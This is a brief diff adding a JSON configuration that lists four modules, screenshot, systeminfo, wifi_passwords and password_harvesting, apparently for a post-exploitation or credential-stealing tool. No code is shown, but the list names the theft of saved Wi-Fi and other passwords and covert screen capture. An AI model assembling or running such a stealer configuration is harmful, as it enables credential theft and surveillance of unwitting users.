@@ -1,0 +1,14 @@
+[
+	{
+		"module":"screenshot"
+	},
+	{
+		"module":"systeminfo"
+	},
+	{
+		"module":"wifi_passwords"
+	},
+	{
+		"module":"password_harvesting"
+	}
+]
